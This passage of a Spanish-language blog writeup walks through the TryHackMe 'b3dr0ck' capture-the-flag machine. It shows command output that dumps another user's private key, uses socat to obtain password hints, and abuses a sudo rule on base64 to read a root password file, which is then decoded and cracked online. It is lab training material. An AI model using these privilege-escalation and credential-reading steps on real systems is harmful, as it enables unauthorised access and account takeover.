gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">sudo </span>certutil
<span class="go">
Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
</span></pre></table></code></div></div><p>Según lo anterior, podemos listar y generar certificados.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">sudo </span>certutil <span class="nb">ls</span>
<span class="go">
Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  8 14:41 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  8 14:41 barney.csr.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  8 14:41 fred.certificate.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  8 14:41 fred.csr.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 fred.serviceKey.pem

</span><span class="gp">barney@b3dr0ck:/home$</span><span class="w">
</span></pre></table></code></div></div><p>Bien. Según el listado anterior tenemos acceso al certificado y la clave del usuario <em>fred</em>. Vamos a hacernos con ello.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">sudo </span>certutil <span class="nb">cat</span> /usr/share/abc/certs/fred.certificate.pem
<span class="go">Generating credentials for user: cat (usrshareabccertsfredcertificatepem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuL8GCdbmIn6vOA6HG6lk6kh/ONUQstPekZtleyGC4MLQM7Jy
dL2xnf/3OiG3I8Mpg7SCr7Q7lnZjCXx0vedjFHk+15WYaP4H2Fs5VtJ75w0pfu+9
F/b8PIZpxligz5uWDRKaCogQR9n8wGSgFnd6Sav9G83a6FrBRt4XtxgdbnDy2/DZ
[...]
PrcccQKBgH9PfBEuZ6f3zibRkFbqbc/KzV1vOtqsVUVfVIW8Lspiou0eg34aQ0fO
oFqGU2ikKsrL7eAYHBpdrYuqH950xgkwXJZJT/OP6Zt4yDDNGTHXJtJ3RjLhygqm
fcBaHqct5fauNjmCK7eu/wG4esPi7C2oygFcTWqtcqAxH+vwoWvh
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICtjCCAZ4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDgxNTI2MThaFw0yMjA5MDkxNTI2MThaMC0xKzApBgNVBAMMInVz
cnNoYXJlYWJjY2VydHNmcmVkY2VydGlmaWNhdGVwZW0wggEiMA0GCSqGSIb3DQEB
[...]
J6dVlXfg2PaJABcXUQsU35a5Ne+SF9e5FliPAYG4750sfLB8VGVfZ9JBvyGJ2zLJ
kyRczMI9Z+8lQO/rt6WmwYIBNhChGhkv0+5xNQt1aIxV2xhz27oGBS32GqKGYMek
sDYWHwJVvLHGPEMoaeQ4+mFlIHlsaE6p6g8=
-----END CERTIFICATE-----
</span><span class="gp">barney@b3dr0ck:/home$</span><span class="w">
</span></pre></table></code></div></div><p>Como hemos hecho con el usuario <em>barney</em>, copiamos la clave y el certificado de <em>fred</em> y creamos con ellos los ficheros <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">fred.key.pem</code>   y <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">fred.cert.pem</code> respectivamente.</p><p>Volvemos a tirar de <strong>socat</strong> y el servicio de login corriendo en el puerto <em>54321/tcp</em> para hacernos con la contraseña de <em>fred</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>socat stdio ssl:10.10.40.42:54321,cert<span class="o">=</span>fred.cert.pem,key<span class="o">=</span>fred.key.pem,verify<span class="o">=</span>0
<span class="go">

 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'usrshareabccertsfredcertificatepem' is authorized.
</span><span class="gp">b3dr0ck&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">Unrecognized command: 'ls'

This service is for login and password hints
</span><span class="gp">b3dr0ck&gt;</span><span class="w"> </span><span class="nb">help</span>
<span class="go">Password hint: Yab[...]00! (user = 'usrshareabccertsfredcertificatepem')
</span><span class="gp">b3dr0ck&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Conectamos por <strong>ssh</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>ssh fred@10.10.40.42
<span class="go">fred@10.10.40.42's password:
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">fred.txt
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w"> </span><span class="nb">cat </span>fred.txt
<span class="go">THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w">
</span></pre></table></code></div></div><p>Obtenemos la flag correspondiente al usuario <em>fred</em>. Como ya hemos hecho con <em>barney</em>, buscamos los binarios disponibles para este segundo usuario.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">fred@b3dr0ck:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w">
</span></pre></table></code></div></div><p>Bien. Según ésto, <em>fred</em> puede ejecutar sin que nos solicite contraseña los binarios <code class="language-plaintext highlighter-rouge">/usr/bin/base32</code>  y <code class="language-plaintext highlighter-rouge">/usr/bin/base64</code>  sobre el fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">pass.txt</code>  ubicado en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/root</code> .</p><p>Vamos a ello.</p><h2 id="escalado-de-privilegios-vertical"><span class="mr-2">Escalado de privilegios vertical</span><a href="#escalado-de-privilegios-vertical" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Aprovechando lo anterior, codificamos y decodificamos el contenido del fichero para hacernos con su contenido:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">fred@b3dr0ck:~$</span><span class="w">
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w"> </span><span class="nb">sudo base64</span> /root/pass.txt | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">LFKEC52ZKRC[...]CWNBGXURTLJZKFSSYK
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w">
</span></pre></table></code></div></div><p>OK. Con la operación anterior hemos obtenido una cadena que no sabemos muy bien qué es. Tiramos del servicio online <a href="https://cyberchef.org">Cyberchef</a> para que nos eche una mano.</p><p>Para ello, copiamos la cadena que hemos obtenido en el campo <strong>Input</strong>.</p><p>Automaticamente se nos completa el campo <strong>Output</strong> y se nos habilita la opción de la <em>varita mágica</em></p><p><img data-src="/assets/posts/20220908/img_03.png" alt="" data-proofer-ignore></p><p>Si nos posicionamos con el ratón sobre el ícono de la varita, <strong>Cyberchef</strong> nos cuenta lo siguiente:</p><p><img data-src="/assets/posts/20220908/img_04.png" alt="" data-proofer-ignore></p><p>Según <strong>Cyberchef</strong>, la cadena que tenemos ha sido codificada varias veces. Le damos a la varita.</p><p><img data-src="/assets/posts/20220908/img_05.png" alt="" data-proofer-ignore></p><p>OK, ahora tenemos un hash que podemos crakear utilizando otra herramienta online, en este caso, <a href="https://crackstation.net/">Crackstation</a>. Vamos a ello.</p><p><img data-src="/assets/posts/20220908/img_06.png" alt="" data-proofer-ignore></p><p>Si todo ha ido bien, nos hemos hecho con la contraseña del usuario <em>root</em>.</p><p>Volvemos al terminal que tenemos abierto con la sesión del usuario <em>fred</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">fred@b3dr0ck:~$</span><span class="w">
</span><span class="gp">fred@b3dr0ck:~$</span><span class="w"> </span>su
<span class="go">Password:
</span><span class="gp">root@b3dr0ck:/home/fred#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="gp">root@b3dr0ck:~#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">pass.txt  root.txt  snap
</span><span class="gp">root@b3dr0ck:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
</span><span class="gp">root@b3dr0ck:~#</span><span class="w">
</span></pre></table></code></div></div><p>Misión cumplida.</p><p>Espero que os haya servido de ayuda.</p><p>Saludos he intentar ser felices.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/try-hack-me/'>Try Hack Me</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Try+Hack+Me+-+b3dr0ck+-+Writeup+-+ewan67&url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-b3dr0ck%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Try+Hack+Me+-+b3dr0ck+-+Writeup+-+ewan67&u=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-b3dr0ck%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-b3dr0ck%2F&text=Try+Hack+Me+-+b3dr0ck+-+Writeup+-+ewan67" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-writeup-tier1-three/">Hack The Box - Starting Point - Tier 1 - Three Writeup</a><li><a href="/posts/thm-writeup-brooklyn-nine-nine/">Try Hack Me - Brooklyn Nine Nine - Writeup</a><li><a href="/posts/thm-writeup-anonymous/">Try Hack Me - Anonymous - Writeup</a><li><a href="/posts/thm-writeup-olympus/">Try Hack Me - Olympus - Writeup</a><li><a href="/posts/thm-writeup-agentt/">Try Hack Me - Agent T - Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-writeup-brooklyn-nine-nine/"><div class="card-body"> <em class="small" data-ts="1660613400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Brooklyn Nine Nine - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Brooklyn Nine Nine disponible en THM, un sencillo CTF creado por Fsociety2006 en el que pondremos en práctica técnicas de enumeración, esteganografía y ...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-anonymous/"><div class="card-body"> <em class="small" data-ts="1660649400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Anonymous - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Anonymous disponible en THM, un CTF de dificultad media creado por Nameless0ne en el que pondremos en práctica técnicas de enumeración y escalado de pri...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-intermediate-nmap/"><div class="card-body"> <em class="small" data-ts="1663551000" data-df="YYYY-MM-DD" > 2022-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Intermediate Nmap - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con el room Intermediate Nmap de THM cuyo autor es cmnatic. Se trata de un CTF de nivel Easy realmente sencillo en el que utilizaremos herramientas como nmap, netcat y...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-writeup-anonymous/" class="btn btn-outline-primary" prompt="Anterior"><p>Try Hack Me - Anonymous - Writeup</p></a> <a href="/posts/thm-writeup-intermediate-nmap/" class="btn btn-outline-primary" prompt="Nuevo"><p>Try Hack Me - Intermediate Nmap - Writeup</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ewan674">ewan67</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
